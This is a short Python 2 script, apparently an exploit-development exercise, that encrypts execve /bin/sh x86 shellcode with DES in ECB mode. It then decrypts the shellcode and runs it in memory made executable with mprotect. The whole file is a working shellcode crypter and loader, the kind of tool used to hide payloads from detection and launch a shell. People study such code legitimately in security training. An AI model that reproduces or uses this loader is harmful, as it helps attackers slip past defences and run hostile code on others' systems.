#!/usr/bin/python


from ctypes import *
from Crypto.Cipher import DES

#below is the shellcode for bin/sh using execve sys call
shell_code = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

print "[+]Length of original shellcode:", len(shell_code)

#shellcode must be multiple of 8 .below code validates that and if not multiple of 8 remaining bytes of NOP's are added to make multiple of 8 bytes

if (len(shell_code) % 8)!= 0:
	
	  shell_code += ("\x90" * (8- len(shell_code) % 8))

	  print "[+]Adding NOP's to the original shellcode"

print "[+]Length of shellcode after Adding NOP", len(shell_code)

#below is the function to display the encrypted and decrypted shellcode in hex

def out_shellcodeformat(shell_code):
        encoded = ""
        for x in bytearray(shell_code):
                
                encoded += '\\x'
                encoded += '%02x' % x
        print (encoded)


#The key ‘35123457’ is 8 bytes	hence shellcode must be multiple of 8
#mode is selcted as ECB	

s = DES.new('35123457', DES.MODE_ECB)

en = s.encrypt(shell_code)

print "[+]Encrypted Shellcode using DES (ECB mode):", out_shellcodeformat(en)

dec = s.decrypt(en)

print "[+]Decrypted Shellcode:", out_shellcodeformat(dec)

libc = CDLL('libc.so.6')  
sc = c_char_p(dec)	
size = len(dec)
print "[+]Length of decrypted shellcode:", size
addr = c_void_p(libc.valloc(size))
memmove(addr, sc, size)
libc.mprotect(addr, size, 0x7)
run = cast(addr, CFUNCTYPE(c_void_p))
run()
